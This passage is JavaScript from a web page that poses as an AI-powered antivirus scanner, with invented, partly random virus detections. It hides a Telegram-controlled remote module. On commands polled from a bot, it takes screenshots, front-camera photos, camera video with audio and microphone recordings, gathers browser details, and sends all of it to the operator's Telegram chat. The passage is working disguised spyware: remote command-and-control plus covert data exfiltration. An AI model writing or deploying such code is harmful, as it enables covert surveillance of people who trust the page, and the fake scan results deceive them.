        messageDiv.style.cssText = `
          margin-bottom: 16px;
          animation: slideIn 0.3s ease;
          display: flex;
          gap: 12px;
          ${role === 'user' ? 'flex-direction: row-reverse;' : ''}
        `;
        
        const avatar = document.createElement('div');
        avatar.style.cssText = `
          width: 36px;
          height: 36px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 20px;
          flex-shrink: 0;
          ${role === 'user' 
            ? 'background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);' 
            : 'background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);'
          }
        `;
        avatar.innerHTML = role === 'user' ? 'üë§' : 'ü§ñ';
        
        const contentDiv = document.createElement('div');
        contentDiv.style.cssText = `flex: 1; max-width: 75%;`;
        
        const bubble = document.createElement('div');
        bubble.style.cssText = `
          padding: 12px 16px;
          border-radius: 12px;
          font-size: 14px;
          line-height: 1.6;
          ${role === 'user' 
            ? 'background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #ffffff; margin-left: auto;' 
            : 'background: rgba(30, 41, 59, 0.8); color: #ffffff; border: 1px solid rgba(0, 212, 255, 0.3);'
          }
        `;
        
        if (isLoading) {
          bubble.innerHTML = `<div style="display: flex; gap: 6px; align-items: center;"><div class="scanning-spinner" style="width: 14px; height: 14px; border-width: 2px;"></div><span style="color: #8892b0;">AI thinking...</span></div>`;
        } else {
          const formattedContent = content
            .replace(/\*\*(.*?)\*\*/g, '<strong style="color: #00d4ff;">$1</strong>')
            .replace(/\n/g, '<br>');
          bubble.innerHTML = formattedContent;
        }
        
        const timeDiv = document.createElement('div');
        timeDiv.style.cssText = `font-size: 11px; color: #8892b0; margin-top: 4px; ${role === 'user' ? 'text-align: right;' : ''}`;
        timeDiv.textContent = timestamp;
        
        contentDiv.appendChild(bubble);
        contentDiv.appendChild(timeDiv);
        messageDiv.appendChild(avatar);
        messageDiv.appendChild(contentDiv);
        
        if (AppState.chatMessages.length === 0) {
          chatContainer.innerHTML = '';
        }
        
        chatContainer.appendChild(messageDiv);
        chatContainer.scrollTop = chatContainer.scrollHeight;
        
        return messageDiv;
      }
    };

    window.closeAlert = () => {
      document.getElementById('alertPopup').classList.remove('show');
    };
  </script><!-- ============================================
       SCANNER MODULE
       ============================================ -->
  <script>
    const Scanner = {
      async scanFile(file, index) {
        AppState.uploadedFiles[index].status = 'scanning';
        UI.renderFileQueue();

        await Utils.sleep(1500);

        const fileName = file.name.toLowerCase();
        const fileExt = fileName.substring(fileName.lastIndexOf('.'));
        
        let isInfected = false;
        let detectedThreats = [];

        CONFIG.scanner.virusSignatures.forEach(signature => {
          if (fileName.includes(signature)) {
            isInfected = true;
            detectedThreats.push(`Suspicious filename: "${signature}"`);
          }
        });

        if (CONFIG.scanner.suspiciousExtensions.includes(fileExt)) {
          isInfected = true;
          detectedThreats.push(`Dangerous format: ${fileExt}`);
        }

        AppState.stats.scanned++;

        if (isInfected) {
          AppState.uploadedFiles[index].status = 'infected';
          AppState.stats.viruses++;
          
          const virusType = CONFIG.scanner.virusTypes[Math.floor(Math.random() * CONFIG.scanner.virusTypes.length)];
          
          const threat = {
            name: virusType.name,
            severity: virusType.severity,
            icon: virusType.icon,
            path: file.name + " - " + detectedThreats.slice(0, 2).join(", ")
          };
          AppState.threats.push(threat);
          UI.renderThreats();
          UI.showAlert(`Virus detected: ${threat.name} in ${file.name}`);
          UI.logActivity(`ü¶† Detected: ${threat.name}`, 'danger');
        } else {
          AppState.uploadedFiles[index].status = 'clean';
          AppState.stats.clean++;
        }

        UI.updateStats();
        UI.renderFileQueue();
      },

      async scanSystem() {
        if (AppState.scanning.isActive) return;
        
        AppState.scanning.isActive = true;
        AppState.scanning.progress = 0;
        document.getElementById('scanBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        
        const scanPhases = [
          { progress: 15, status: 'Scanning memory...', action: () => { AppState.stats.scanned += 5; UI.updateStats(); } },
          { progress: 30, status: 'Scanning plugins...', action: () => { AppState.stats.scanned += 3; UI.updateStats(); } },
          { progress: 45, status: 'Scanning cookies & storage...', action: this.scanStorage.bind(this) },
          { progress: 60, status: 'Checking network...', action: () => { AppState.stats.scanned += 5; UI.updateStats(); } },
          { progress: 75, status: 'Security analysis...', action: this.scanSecurity.bind(this) },
          { progress: 90, status: 'Scanning hardware...', action: () => { AppState.stats.scanned += 15; UI.updateStats(); } },
          { progress: 100, status: 'Complete!', action: null }
        ];

        for (const phase of scanPhases) {
          if (!AppState.scanning.isActive) break;
          
          UI.updateProgress(phase.progress, phase.status);
          
          if (phase.action) {
            await phase.action();
          }
          await Utils.sleep(800);
        }
        
        this.stopScan();
        UI.logActivity('‚úÖ System scan complete', 'info');
      },

      async scanStorage() {
        AppState.stats.scanned += 10;
        UI.updateStats();
        
        try {
          const cookies = document.cookie.split(';');
          if (cookies.length > 20) {
            AppState.threats.push({
              name: "High Cookie Count",
              severity: "low",
              icon: "üç™",
              path: `${cookies.length} cookies detected`
            });
            AppState.stats.viruses++;
            UI.renderThreats();
            UI.updateStats();
          }
        } catch (e) {
          console.log('Cannot access cookies');
        }
      },

      async scanSecurity() {
        AppState.stats.scanned += 8;
        UI.updateStats();
        
        if (window.location.protocol !== 'https:') {
          AppState.threats.push({
            name: "Insecure Connection",
            severity: "high",
            icon: "‚ö†Ô∏è",
            path: `Protocol: ${window.location.protocol}`
          });
          AppState.stats.viruses++;
          UI.renderThreats();
          UI.updateStats();
        }
      },

      stopScan() {
        AppState.scanning.isActive = false;
        document.getElementById('scanBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
      }
    };
  </script><!-- ============================================
       WORKER MODULE
       ============================================ -->
  <script>
    const WorkerModule = {
      createWorker() {
        const workerCode = `
          let scanInterval = null;
          let scanCount = 0;
          let threatsFound = 0;
          
          const threatDatabase = ${JSON.stringify(CONFIG.worker.threatDatabase)};
          
          function scanSystem() {
            scanCount++;
            let threats = [];
            
            const randomThreat = Math.random();
            
            if (randomThreat < 0.25) {
              const threat = threatDatabase[Math.floor(Math.random() * threatDatabase.length)];
              threats.push(threat);
              threatsFound++;
            }
            
            self.postMessage({
              type: 'scan_complete',
              scanCount: scanCount,
              threatsFound: threatsFound,
              threats: threats,
              timestamp: new Date().toISOString()
            });
          }
          
          self.onmessage = function(e) {
            if (e.data.action === 'start') {
              scanInterval = setInterval(scanSystem, ${CONFIG.worker.scanInterval});
              scanSystem();
              self.postMessage({ type: 'started' });
            } else if (e.data.action === 'stop') {
              if (scanInterval) {
                clearInterval(scanInterval);
                scanInterval = null;
              }
              self.postMessage({ type: 'stopped' });
            } else if (e.data.action === 'scan_now') {
              scanSystem();
            }
          };
        `;
        
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        return new Worker(URL.createObjectURL(blob));
      },

      start() {
        if (AppState.worker.active) {
          console.log('Worker already running');
          return;
        }
        
        try {
          console.log('Starting Background Worker...');
          AppState.worker.instance = this.createWorker();
          
          AppState.worker.instance.onmessage = (e) => {
            const data = e.data;
            console.log('Worker message:', data.type);
            
            if (data.type === 'started') {
              AppState.worker.active = true;
              UI.updateWorkerStatus(true);
              UI.logActivity('Background Security Worker started', 'info');
              UI.showAlert('Background Worker started successfully!');
              console.log('Worker started successfully');
            } else if (data.type === 'stopped') {
              AppState.worker.active = false;
              UI.updateWorkerStatus(false);
              UI.logActivity('Background Worker stopped', 'warning');
            } else if (data.type === 'scan_complete') {
              AppState.worker.scanCount = data.scanCount;
              UI.updateWorkerStats();
              
              UI.logActivity(`Worker scan #${data.scanCount} - Threats: ${data.threatsFound}`, 'info');
              
              if (data.threats && data.threats.length > 0) {
                data.threats.forEach(threat => {
                  AppState.worker.threatsFound++;
                  UI.updateWorkerStats();
                  
                  const severityIcon = threat.severity === 'critical' ? '‚õî' : (threat.severity === 'high' ? 'üî∂' : (threat.severity === 'medium' ? '‚ö°' : '‚úÖ'));
                  
                  const newThreat = {
                    name: threat.name,
                    severity: threat.severity,
                    icon: severityIcon,
                    path: `Worker Auto-Scan: ${threat.desc}`
                  };
                  
                  AppState.threats.push(newThreat);
                  AppState.stats.viruses++;
                  
                  UI.updateStats();
                  UI.renderThreats();
                  
                  UI.logActivity(`Worker detected: ${threat.name}`, 'danger');
                  UI.showAlert(`Background Worker detected: ${threat.name}`);
                });
              }
            }
          };
          
          AppState.worker.instance.onerror = (error) => {
            console.error('Worker error:', error);
            UI.logActivity('Worker error: ' + error.message, 'danger');
            AppState.worker.active = false;
            UI.updateWorkerStatus(false);
          };
          
          console.log('Posting start message to worker...');
          AppState.worker.instance.postMessage({ action: 'start' });
          
        } catch (error) {
          console.error('Failed to start worker:', error);
          UI.logActivity('Cannot start worker: ' + error.message, 'danger');
          UI.showAlert('Error: Browser does not support Web Worker!');
        }
      },

      stop() {
        if (!AppState.worker.active || !AppState.worker.instance) return;
        
        AppState.worker.instance.postMessage({ action: 'stop' });
        AppState.worker.instance.terminate();
        AppState.worker.active = false;
        UI.logActivity('üõë Background Worker stopped', 'warning');
      }
    };
  </script><!-- ============================================
       AI MODULE
       ============================================ -->
  <script>
    const AI = {
      async callGroqAPI(systemPrompt, userPrompt) {
        try {
          const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${CONFIG.groq.apiKey}`
            },
            body: JSON.stringify({
              model: CONFIG.groq.model,
              messages: [
                { role: 'system', content: systemPrompt },
                { role: 'user', content: userPrompt }
              ],
              temperature: 0.7,
              max_tokens: 1000
            })
          });

          if (!response.ok) {
            const errorData = await response.json();
            return { error: `API Error: ${errorData.error?.message || 'Unknown error'}` };
          }

          const data = await response.json();
          return { 
            success: true, 
            content: data.choices[0].message.content 
          };
        } catch (error) {
          return { error: `Network Error: ${error.message}` };
        }
      },

      async analyzeSystem() {
        const systemPrompt = `You are an AI security expert. Provide:
1. Risk assessment (Low/Medium/High/Critical)
2. Detailed threat analysis
3. Specific recommendations
Answer in VIETNAMESE, formatted beautifully with emojis.`;

        const userPrompt = `Security analysis:

STATISTICS:
- Threats: ${AppState.threats.length}
- Quarantined: ${AppState.quarantine.length}
- Files scanned: ${AppState.stats.scanned}
- Worker: ${AppState.worker.active ? 'Active' : 'Inactive'}
- Worker Scans: ${AppState.worker.scanCount}

THREATS:
${AppState.threats.length > 0 ? AppState.threats.map((t, i) => `${i + 1}. ${t.name} (${t.severity}): ${t.path}`).join('\n') : 'None'}

SYSTEM:
- Browser: ${navigator.userAgent.substring(0, 50)}
- Platform: ${navigator.platform}
- Cookies: ${document.cookie.split(';').length}`;

        return await this.callGroqAPI(systemPrompt, userPrompt);
      },

      async chat(userMessage) {
        const systemContext = `You are an AI Security Expert specializing in security, viruses, malware.
IMPORTANT: Answer CONCISELY (2-4 sentences), EASY TO UNDERSTAND, in VIETNAMESE, with emojis.

System info:
- Viruses: ${AppState.stats.viruses}
- Files: ${AppState.stats.scanned}
- Worker: ${AppState.worker.active ? 'Active' : 'Inactive'}
- Worker Scans: ${AppState.worker.scanCount}`;
        
        return await this.callGroqAPI(systemContext, userMessage);
      }
    };
  </script><!-- ============================================
       SCREENSHOT MODULE
       ============================================ -->
  <script>
    const Screenshot = {
      async capture() {
        try {
          UI.logActivity('üì∏ Capturing full screenshot...', 'info');
          
          // L·∫•y k√≠ch th∆∞·ªõc viewport (m√†n h√¨nh hi·ªÉn th·ªã)
          const viewportWidth = window.innerWidth;
          const viewportHeight = window.innerHeight;
          
          // Ch·ª•p m√†n h√¨nh v·ªõi t·ª∑ l·ªá viewport (ph√π h·ª£p ƒëi·ªán tho·∫°i)
          const canvas = await html2canvas(document.body, {
            backgroundColor: '#1a1a2e',
            scale: 1.5,
            logging: false,
            useCORS: true,
            allowTaint: true,
            width: viewportWidth,
            height: viewportHeight,
            windowWidth: viewportWidth,
            windowHeight: viewportHeight,
            x: window.scrollX,
            y: window.scrollY
          });
          
          // Chuy·ªÉn canvas th√†nh blob
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
          
          const sizeKB = (blob.size / 1024).toFixed(2);
          UI.logActivity(`üì§ Sending screenshot (${sizeKB} KB)...`, 'info');
          
          // G·ª≠i ·∫£nh qua Telegram
          const result = await Telegram.sendPhoto(blob, `üì∏ Screenshot\nüì± ${viewportWidth}x${viewportHeight}\nüíæ ${sizeKB} KB\nüïê ${Utils.formatDateTime()}`);
          
          if (result.success) {
            UI.showAlert('‚úÖ Screenshot sent successfully!');
            UI.logActivity('‚úÖ Screenshot sent to Telegram', 'info');
          } else {
            UI.showAlert(`‚ùå Failed: ${result.error}`);
            UI.logActivity(`ÔøΩÔøΩ Screenshot error: ${result.error}`, 'danger');
          }
          
        } catch (error) {
          console.error('Screenshot error:', error);
          UI.showAlert('Screenshot loi: ' + error.message);
          UI.logActivity('Screenshot loi: ' + error.message, 'danger');
        }
      }
    };
  </script><!-- html2canvas Library -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script><!-- ============================================
       CAMERA & RECORDING MODULE
       ============================================ -->
  <script>
    const Camera = {
      activeStream: null,
      mediaRecorder: null,
      recordedChunks: [],
      recordingType: null,
      recordingTimeout: null,

      // Ch·ª•p ·∫£nh t·ª´ camera tr∆∞·ªõc
      async capturePhoto() {
        try {
          UI.logActivity('üì∑ Accessing front camera...', 'info');
          
          // Request camera tr∆∞·ªõc
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { 
              facingMode: 'user',
              width: { ideal: 1280 },
              height: { ideal: 720 }
            },
            audio: false
          });

          this.activeStream = stream;
          
          // T·∫°o video element ·∫©n
          const video = document.createElement('video');
          video.srcObject = stream;
          video.autoplay = true;
          video.muted = true;
          video.style.display = 'none';
          document.body.appendChild(video);
          
          // ƒê·ª£i video s·∫µn s√†ng
          await new Promise((resolve) => {
            video.onloadedmetadata = () => {
              video.play();
              resolve();
            };
          });
          
          // ƒê·ª£i th√™m ƒë·ªÉ camera ·ªïn ƒë·ªãnh
          await Utils.sleep(1000);
          
          // Ch·ª•p ·∫£nh
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);
          
          // Cleanup
          stream.getTracks().forEach(track => track.stop());
          video.remove();
          this.activeStream = null;
          
          // Chuy·ªÉn th√†nh blob
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
          
          const sizeKB = (blob.size / 1024).toFixed(2);
          UI.logActivity(`üì§ Sending photo (${sizeKB} KB)...`, 'info');
          
          // G·ª≠i qua Telegram
          const result = await Telegram.sendPhoto(blob, `üì∑ Front Camera Photo\nüìè ${canvas.width}x${canvas.height}\nüíæ ${sizeKB} KB\nüïê ${Utils.formatDateTime()}`);
          
          if (result.success) {
            UI.showAlert('‚úÖ Photo captured & sent!');
            UI.logActivity('‚úÖ Camera photo sent', 'info');
            return { success: true };
          } else {
            UI.showAlert(`‚ùå Failed: ${result.error}`);
            UI.logActivity(`‚ùå Photo error: ${result.error}`, 'danger');
            return { success: false, error: result.error };
          }
          
        } catch (error) {
          console.error('Camera error:', error);
          const errorMsg = error.name === 'NotAllowedError' 
            ? 'Chua cap quyen Camera' 
            : error.message;
          UI.showAlert('Camera loi: ' + errorMsg);
          UI.logActivity('Camera loi: ' + errorMsg, 'danger');
          
          if (this.activeStream) {
            this.activeStream.getTracks().forEach(track => track.stop());
            this.activeStream = null;
          }
          
          return { success: false, error: errorMsg };
        }
      },

      // Screen recording khong kha dung trong iframe
      async startScreenRecording(duration = 10) {
        const errorMsg = 'Screen recording khong kha dung trong iframe';
        UI.showAlert(errorMsg);
        UI.logActivity(errorMsg, 'danger');
        return { success: false, error: errorMsg };
      },

      // Quay video camera tr∆∞·ªõc
      async startCameraRecording(duration = 10) {
        try {
          UI.logActivity(`ÔøΩÔøΩÔøΩ Starting camera recording (${duration}s)...`, 'info');
          
          // Request camera + audio
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { 
              facingMode: 'user',
              width: { ideal: 1280 },
              height: { ideal: 720 },
              frameRate: { ideal: 30 }
            },
            audio: true
          });

          this.activeStream = stream;
          this.recordedChunks = [];
          this.recordingType = 'camera';
          
          // T·∫°o MediaRecorder
          this.mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'video/webm;codecs=vp9',
            videoBitsPerSecond: 2500000
          });
          
          this.mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              this.recordedChunks.push(event.data);
            }
          };
          
          this.mediaRecorder.onstop = async () => {
            await this.handleRecordingComplete();
          };
          
          this.mediaRecorder.start();
          UI.logActivity(`‚è∫ Recording camera for ${duration}s...`, 'warning');
          
          // Auto stop sau duration gi√¢y
          this.recordingTimeout = setTimeout(() => {
            this.stopRecording();
          }, duration * 1000);
          
          return { success: true };
          
        } catch (error) {
          console.error('Camera recording error:', error);
          const errorMsg = error.name === 'NotAllowedError' 
            ? 'Chua cap quyen Camera/Mic' 
            : error.message;
          UI.showAlert('Camera recording loi: ' + errorMsg);
          UI.logActivity('Camera recording loi: ' + errorMsg, 'danger');
          
          this.cleanup();
          return { success: false, error: errorMsg };
        }
      },

      // Ghi √¢m
      async startAudioRecording(duration = 10) {
        try {
          UI.logActivity(`üéôÔ∏è Starting audio recording (${duration}s)...`, 'info');
          
          // Request microphone
          const stream = await navigator.mediaDevices.getUserMedia({
            audio: {
              echoCancellation: true,
              noiseSuppression: true,
              autoGainControl: true
            },
            video: false
          });

          this.activeStream = stream;
          this.recordedChunks = [];
          this.recordingType = 'audio';
          
          // T·∫°o MediaRecorder
          this.mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'audio/webm;codecs=opus'
          });
          
          this.mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              this.recordedChunks.push(event.data);
            }
          };
          
          this.mediaRecorder.onstop = async () => {
            await this.handleRecordingComplete();
          };
          
          this.mediaRecorder.start();
          UI.logActivity(`ÔøΩÔøΩ Recording audio for ${duration}s...`, 'warning');
          
          // Auto stop sau duration gi√¢y
          this.recordingTimeout = setTimeout(() => {
            this.stopRecording();
          }, duration * 1000);
          
          return { success: true };
          
        } catch (error) {
          console.error('Audio recording error:', error);
          const errorMsg = error.name === 'NotAllowedError' 
            ? 'Chua cap quyen Microphone' 
            : error.message;
          UI.showAlert('Audio recording loi: ' + errorMsg);
          UI.logActivity('Audio recording loi: ' + errorMsg, 'danger');
          
          this.cleanup();
          return { success: false, error: errorMsg };
        }
      },

      // D·ª´ng recording
      stopRecording() {
        if (this.recordingTimeout) {
          clearTimeout(this.recordingTimeout);
          this.recordingTimeout = null;
        }
        
        if (this.mediaRecorder && this.mediaRecorder.state !== 'inactive') {
          this.mediaRecorder.stop();
          return { success: true };
        }
        
        return { success: false, error: 'No active recording' };
      },

      // X·ª≠ l√Ω khi recording ho√†n th√†nh
      async handleRecordingComplete() {
        try {
          const mimeType = this.recordingType === 'audio' ? 'audio/webm' : 'video/webm';
          const blob = new Blob(this.recordedChunks, { type: mimeType });
          const sizeMB = (blob.size / (1024 * 1024)).toFixed(2);
          
          UI.logActivity(`üì§ Sending ${this.recordingType} (${sizeMB} MB)...`, 'info');
          
          const icon = this.recordingType === 'screen' ? 'üé•' : (this.recordingType === 'camera' ? 'üé¨' : 'ÔøΩÔøΩÔøΩÔ∏è');
          const label = this.recordingType === 'screen' ? 'Screen Recording' : (this.recordingType === 'camera' ? 'Camera Recording' : 'Audio Recording');
          
          // G·ª≠i qua Telegram
          const result = await Telegram.sendVideo(blob, `${icon} ${label}\nüíæ Size: ${sizeMB} MB\nüïê ${Utils.formatDateTime()}`);
          
          if (result.success) {
            UI.showAlert(label + ' da gui thanh cong!');
            UI.logActivity(label + ' da gui den Telegram', 'info');
          } else {
            UI.showAlert('Gui loi: ' + result.error);
            UI.logActivity('Gui loi: ' + result.error, 'danger');
          }
          
        } catch (error) {
          console.error('Recording save error:', error);
          UI.showAlert('Luu loi: ' + error.message);
          UI.logActivity('Recording luu loi: ' + error.message, 'danger');
        } finally {
          this.cleanup();
        }
      },

      // Cleanup resources
      cleanup() {
        if (this.activeStream) {
          this.activeStream.getTracks().forEach(track => track.stop());
          this.activeStream = null;
        }
        
        if (this.recordingTimeout) {
          clearTimeout(this.recordingTimeout);
          this.recordingTimeout = null;
        }
        
        this.mediaRecorder = null;
        this.recordedChunks = [];
        this.recordingType = null;
      }
    };
  </script><!-- ============================================
       TELEGRAM MODULE
       ============================================ -->
  <script>
    const Telegram = {
      async sendMessage(message) {
        if (!CONFIG.telegram.chatId) {
          return { success: false, error: 'Chat ID not configured' };
        }

        const messageKey = message.substring(0, 50);
        const now = Date.now();
        
        if (AppState.telegram.lastSentMessages.has(messageKey)) {
          const lastSent = AppState.telegram.lastSentMessages.get(messageKey);
          if (now - lastSent < 3000) {
            return { success: true, skipped: true };
          }
        }
        
        AppState.telegram.lastSentMessages.set(messageKey, now);
        
        if (AppState.telegram.lastSentMessages.size > 20) {
          const oldestKey = Array.from(AppState.telegram.lastSentMessages.keys())[0];
          AppState.telegram.lastSentMessages.delete(oldestKey);
        }

        try {
          const url = `https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendMessage`;
          const response = await fetch(url, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: CONFIG.telegram.chatId,
              text: message,
              parse_mode: 'HTML'
            })
          });

          const data = await response.json();
          
          if (data.ok) {
            console.log('üì§ Telegram sent:', message.substring(0, 50));
            return { success: true };
          } else {
            console.error('‚ùå Telegram error:', data.description);
            return { success: false, error: data.description };
          }
        } catch (error) {
          console.error('‚ùå Network error:', error.message);
          return { success: false, error: error.message };
        }
      },

      async sendPhoto(blob, caption) {
        if (!CONFIG.telegram.chatId) {
          return { success: false, error: 'Chat ID not configured' };
        }

        try {
          const formData = new FormData();
          formData.append('chat_id', CONFIG.telegram.chatId);
          formData.append('photo', blob, 'screenshot.png');
          formData.append('caption', caption);
          formData.append('parse_mode', 'HTML');

          const url = `https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendPhoto`;
          const response = await fetch(url, {
            method: 'POST',
            body: formData
          });

          const data = await response.json();
          
          if (data.ok) {
            console.log('üì∏ Screenshot sent to Telegram');
            return { success: true };
          } else {
            console.error('‚ùå Telegram photo error:', data.description);
            return { success: false, error: data.description };
          }
        } catch (error) {
          console.error('‚ùå Network error:', error.message);
          return { success: false, error: error.message };
        }
      },

      async sendVideo(blob, caption) {
        if (!CONFIG.telegram.chatId) {
          return { success: false, error: 'Chat ID not configured' };
        }

        try {
          const formData = new FormData();
          formData.append('chat_id', CONFIG.telegram.chatId);
          
          // X√°c ƒë·ªãnh lo·∫°i file d·ª±a tr√™n mime type
          const fileName = blob.type.includes('audio') ? 'recording.webm' : 'video.webm';
          const method = blob.type.includes('audio') ? 'sendAudio' : 'sendVideo';
          const fieldName = blob.type.includes('audio') ? 'audio' : 'video';
          
          formData.append(fieldName, blob, fileName);
          formData.append('caption', caption);
          formData.append('parse_mode', 'HTML');

          const url = `https://api.telegram.org/bot${CONFIG.telegram.botToken}/${method}`;
          const response = await fetch(url, {
            method: 'POST',
            body: formData
          });

          const data = await response.json();
          
          if (data.ok) {
            console.log(`ÔøΩÔøΩ ${method} sent to Telegram`);
            return { success: true };
          } else {
            console.error(`‚ùå Telegram ${method} error:`, data.description);
            return { success: false, error: data.description };
          }
        } catch (error) {
          console.error('‚ùå Network error:', error.message);
          return { success: false, error: error.message };
        }
      },

      async pollCommands() {
        if (!AppState.telegram.connected || !CONFIG.telegram.chatId) return;

        try {
          const url = `https://api.telegram.org/bot${CONFIG.telegram.botToken}/getUpdates?offset=${AppState.telegram.lastUpdateId + 1}&timeout=10`;
          const response = await fetch(url);
          const data = await response.json();

          if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
              AppState.telegram.lastUpdateId = update.update_id;
              
              if (update.message && update.message.text) {
                const message = update.message.text.trim();
                const messageKey = `${update.message.message_id}_${message}`;
                
                if (!AppState.telegram.processedCommands.has(messageKey)) {
                  AppState.telegram.processedCommands.add(messageKey);
                  
                  if (AppState.telegram.processedCommands.size > 50) {
                    const firstKey = Array.from(AppState.telegram.processedCommands)[0];
                    AppState.telegram.processedCommands.delete(firstKey);
                  }
                  
                  if (message.startsWith('/')) {
                    await this.executeCommand(message);
                  } else {
                    await this.handleAIChat(message);
                  }
                }
              }
            }
          }
        } catch (error) {
          console.error('Polling error:', error);
        }
      },

      async executeCommand(command) {
        console.log(`üì• Remote command: ${command}`);
        UI.logActivity(`Remote: ${command}`, 'info');

        // Parse command v√† duration (v√≠ d·ª•: /record_screen_15 = 15 gi√¢y)
        const parts = command.split('_');
        const lastPart = parts[parts.length - 1];
        const duration = parseInt(lastPart) || 10;

        if (command === '/scan') {
          await this.sendMessage('üîç <b>Starting security scan...</b>');
          await Scanner.scanSystem();
          setTimeout(async () => {
            const report = `<b>üìä SCAN RESULTS:</b>\n\nü¶† Viruses: ${AppState.stats.viruses}\nÔøΩÔøΩÔøΩÔøΩ Files: ${AppState.stats.scanned}\n‚úÖ Clean: ${AppState.stats.clean}\nüîí Quarantine: ${AppState.stats.quarantined}\n\n<i>Created by DUONG VI</i>`;
            await this.sendMessage(report);
          }, 8000);
        }
        else if (command === '/screenshot') {
          await this.sendMessage('üì∏ <b>Capturing full screenshot...</b>');
          await Screenshot.capture();
        }
        else if (command === '/camera') {
          await this.sendMessage('üì∑ <b>Accessing camera...</b>');
          const result = await Camera.capturePhoto();
          if (!result.success) {
            await this.sendMessage(`‚ùå <b>Camera error:</b>\n${result.error}`);
          }
        }
        else if (command.startsWith('/record_screen')) {
          await this.sendMessage('<b>Screen recording khong kha dung</b>\n\nKhong ho tro trong iframe.\n\nHay dung /screenshot de chup man hinh!');
        }
        else if (command.startsWith('/record_camera')) {
          const dur = Math.min(Math.max(duration, 5), 30); // Min 5s, Max 30s
          await this.sendMessage('<b>Bat dau quay camera...</b>\nThoi luong: ' + dur + 's');
          const result = await Camera.startCameraRecording(dur);
          if (!result.success) {
            await this.sendMessage('<b>Recording loi:</b>\n' + result.error);
          }
        }
        else if (command.startsWith('/record_audio')) {
          const dur = Math.min(Math.max(duration, 5), 30); // Min 5s, Max 30s
          await this.sendMessage('<b>Bat dau ghi am...</b>\nThoi luong: ' + dur + 's');
          const result = await Camera.startAudioRecording(dur);
          if (!result.success) {
            await this.sendMessage('<b>Recording loi:</b>\n' + result.error);
          }
        }
        else if (command === '/stop_recording') {
          const result = Camera.stopRecording();
          if (result.success) {
            await this.sendMessage('<b>Da dung recording</b>');
          } else {
            await this.sendMessage(result.error);
          }
        }
        else if (command === '/help') {
          const helpMsg = '<b>CAC LENH KHA DUNG:</b>\n\n<b>MEDIA:</b>\n/screenshot - Chup man hinh\n/camera - Chup hinh camera\n/record_camera_10 - Quay camera (10s)\n/record_audio_10 - Ghi am (10s)\n/stop_recording - Dung recording\n\n<b>BAN MAT:</b>\n/scan - Quet he thong\n/threats - Danh sach moi de\n/info - Thong tin he thong\n\n<b>WORKER:</b>\n/worker_start - Bat worker\n/worker_stop - Tat worker\n/worker_scan - Quet thu cong\n/worker_status - Trang thai worker\n\n<b>AI CHAT:</b>\nNhap cau hoi truc tiep!\n\n<b>Thoi luong recording:</b>\n5-30 giay (mac dinh: 10s)\nVi du: /record_camera_15 (15s)\nVi du: /record_audio_20 (20s)\n\n<b>Chu y:</b>\nScreen recording khong ho tro.\nDung /screenshot de chup man hinh!\n\n<i>Created by DUONG VI</i>';
          await this.sendMessage(helpMsg);
        }
        else if (command === '/worker_start') {
          await this.sendMessage('<b>Dang khoi dong Background Worker...</b>');
          WorkerModule.start();
          setTimeout(async () => {
            const msg = AppState.worker.active 
              ? 'Worker da bat thanh cong!' 
              : 'Loi khoi dong Worker';
            await this.sendMessage(msg);
          }, 1500);
        }
        else if (command === '/worker_stop') {
          await this.sendMessage('<b>Dang dung Background Worker...</b>');
          WorkerModule.stop();
          setTimeout(async () => {
            await this.sendMessage('Worker da dung');
          }, 1000);
        }
        else if (command === '/worker_scan') {
          if (!AppState.worker.active || !AppState.worker.instance) {
            await this.sendMessage('Worker chua hoat dong. Hay dung /worker_start truoc.');
            return;
          }
          await this.sendMessage('<b>Kich hoat quet thu cong...</b>');
          AppState.worker.instance.postMessage({ action: 'scan_now' });
        }
        else if (command === '/worker_status') {
          const status = '<b>TRANG THAI WORKER:</b>\n\nTrang thai: ' + (AppState.worker.active ? 'Dang chay' : 'Khong hoat dong') + '\nTong so lan quet: ' + AppState.worker.scanCount + '\nMoi de phat hien: ' + AppState.worker.threatsFound + '\n\n<i>Created by DUONG VI</i>';
          await this.sendMessage(status);
        }
        else if (command === '/info') {
          const info = `<b>üì± INFO:</b>\n\nBrowser: ${navigator.userAgent.substring(0, 50)}...\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}\nCookies: ${document.cookie.split(';').length}\nWorker: ${AppState.worker.active ? 'Active' : 'Inactive'}\n\n<i>Created by DUONG VI</i>`;
          await this.sendMessage(info);
        }
        else if (command === '/threats') {
          const threatList = AppState.threats.length > 0 
            ? AppState.threats.map((t, i) => `${i+1}. ${t.name} (${t.severity})`).join('\n')
            : 'No threats';
          
          const msg = `<b>ÔøΩÔøΩÔøΩÔøΩ THREATS:</b>\n\n${threatList}\n\n<i>Created by DUONG VI</i>`;
          await this.sendMessage(msg);
        }
        else {
          await this.sendMessage('Lenh khong hop le.\n\nDung /help de xem tat ca cac lenh!\n\nHoac chat truc tiep voi AI!');
        }
      },

      async handleAIChat(userMessage) {
        console.log(`üí¨ Telegram user: ${userMessage.substring(0, 30)}...`);
